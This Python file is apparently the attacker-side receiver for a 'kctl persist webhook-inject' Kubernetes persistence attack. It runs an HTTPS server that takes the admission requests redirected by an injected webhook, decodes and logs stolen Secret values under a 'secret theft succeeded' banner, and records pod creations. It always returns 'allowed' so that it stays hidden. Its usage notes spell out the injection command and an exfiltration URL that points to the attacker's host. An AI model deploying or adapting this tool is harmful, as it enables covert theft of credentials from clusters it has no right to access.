#!/usr/bin/env python3
"""
Webhook 接收服务器 - 配合 kctl persist webhook-inject 使用

使用方法:
  1. 运行 kctl 注入 webhook 并保存证书:
     persist webhook-inject -t secret-exfil \
       --exfil-url https://your-ip:8443/exfil \
       --external-url https://your-ip:8443/webhook \
       --cert-dir ./certs

  2. 启动此服务器:
     python receive_server_https.py --cert-dir ./certs

  3. 测试:
     kubectl create secret generic test --from-literal=password=secret123
"""

import json
import ssl
import os
import sys
import base64
import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

LOG_FILE = "/tmp/webhook_received.log"


def log(msg):
    """输出日志到文件和终端"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    formatted = f"[{timestamp}] {msg}"
    with open(LOG_FILE, 'a') as f:
        f.write(formatted + '\n')
    print(formatted, flush=True)


class WebhookHandler(BaseHTTPRequestHandler):
    """处理 Webhook 请求"""

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))

        log(f"{'=' * 60}")
        log(f"收到请求: {self.path}")
        log(f"{'=' * 60}")

        uid = ""
        try:
            data = json.loads(body)
            uid = data.get('request', {}).get('uid', '')

            if data.get('kind') == 'AdmissionReview':
                self.handle_admission_review(data)
            else:
                # 普通请求 (如 exfil-url 接收的数据)
                log(f"数据: {json.dumps(data, indent=2, ensure_ascii=False)}")
        except json.JSONDecodeError:
            log(f"非 JSON 数据: {body.decode('utf-8', errors='replace')[:500]}")
        except Exception as e:
            log(f"处理错误: {e}")

        log(f"{'=' * 60}\n")

        # 返回 AdmissionReview 响应
        resp = json.dumps({
            "apiVersion": "admission.k8s.io/v1",
            "kind": "AdmissionReview",
            "response": {"uid": uid, "allowed": True}
        })
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(resp.encode())

    def handle_admission_review(self, data):
        """处理 AdmissionReview 请求"""
        req = data.get('request', {})
        obj = req.get('object', {})
        kind = obj.get('kind', req.get('kind', 'Unknown'))
        name = obj.get('metadata', {}).get('name', 'unknown')
        namespace = obj.get('metadata', {}).get('namespace', 'default')
        operation = req.get('operation', 'UNKNOWN')

        log(f"类型: {kind} | 操作: {operation}")
        log(f"名称: {namespace}/{name}")

        if kind == 'Secret':
            self.handle_secret(obj)
        elif kind == 'Pod':
            self.handle_pod(obj)

    def handle_secret(self, obj):
        """处理 Secret 窃取"""
        log("")
        log(">>> SECRET 窃取成功!")
        log(f"    类型: {obj.get('type', 'Opaque')}")

        # 解码 data 字段
        if 'data' in obj:
            log("    Base64 编码数据:")
            for k, v in obj.get('data', {}).items():
                try:
                    decoded = base64.b64decode(v).decode('utf-8', errors='replace')
                    # 截断过长的值
                    if len(decoded) > 100:
                        decoded = decoded[:100] + "..."
                    log(f"      {k} = {decoded}")
                except Exception:
                    log(f"      {k} = [解码失败] {v[:50]}...")

        # stringData 是明文
        if 'stringData' in obj:
            log("    明文数据:")
            for k, v in obj.get('stringData', {}).items():
                if len(v) > 100:
                    v = v[:100] + "..."
                log(f"      {k} = {v}")

    def handle_pod(self, obj):
        """处理 Pod 信息"""
        log("")
        log(">>> POD 创建拦截!")
        containers = obj.get('spec', {}).get('containers', [])
        for c in containers:
            log(f"    容器: {c.get('name')} | 镜像: {c.get('image')}")

    def log_message(self, *args):
        """禁用默认的请求日志"""
        pass


def main():
    parser = argparse.ArgumentParser(
        description='Webhook 接收服务器 - 配合 kctl persist webhook-inject 使用',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:
  # 使用 kctl 生成的证书
  python receive_server_https.py --cert-dir ./certs

  # 指定端口
  python receive_server_https.py --cert-dir ./certs --port 9443

  # 分别指定证书文件
  python receive_server_https.py --cert ./tls.crt --key ./tls.key
        '''
    )
    parser.add_argument('--cert-dir', help='证书目录 (包含 tls.crt 和 tls.key)')
    parser.add_argument('--cert', help='服务端证书文件路径')
    parser.add_argument('--key', help='服务端私钥文件路径')
    parser.add_argument('--port', type=int, default=8443, help='监听端口 (默认: 8443)')
    parser.add_argument('--host', default='0.0.0.0', help='监听地址 (默认: 0.0.0.0)')

    args = parser.parse_args()

    # 确定证书路径
    if args.cert_dir:
        cert_file = os.path.join(args.cert_dir, 'tls.crt')
        key_file = os.path.join(args.cert_dir, 'tls.key')
    elif args.cert and args.key:
        cert_file = args.cert
        key_file = args.key
    else:
        print("错误: 请指定 --cert-dir 或 --cert/--key")
        print("")
        print("使用方法:")
        print("  1. 先运行 kctl 生成证书:")
        print("     persist webhook-inject -t secret-exfil \\")
        print("       --external-url https://your-ip:8443/webhook \\")
        print("       --cert-dir ./certs")
        print("")
        print("  2. 然后启动此服务器:")
        print("     python receive_server_https.py --cert-dir ./certs")
        sys.exit(1)

    # 检查证书文件
    if not os.path.exists(cert_file):
        print(f"错误: 证书文件不存在: {cert_file}")
        sys.exit(1)
    if not os.path.exists(key_file):
        print(f"错误: 私钥文件不存在: {key_file}")
        sys.exit(1)

    # 清空日志文件
    open(LOG_FILE, 'w').close()

    # 配置 SSL
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        ctx.load_cert_chain(cert_file, key_file)
    except ssl.SSLError as e:
        print(f"错误: 加载证书失败: {e}")
        sys.exit(1)

    # 启动服务器
    server = HTTPServer((args.host, args.port), WebhookHandler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"{'=' * 60}")
    print("Webhook 接收服务器")
    print(f"{'=' * 60}")
    print(f"监听地址: https://{args.host}:{args.port}")
    print(f"证书文件: {cert_file}")
    print(f"私钥文件: {key_file}")
    print(f"日志文件: {LOG_FILE}")
    print(f"{'=' * 60}")
    print("等待 Webhook 请求...\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n服务器已停止")


if __name__ == '__main__':
    main()
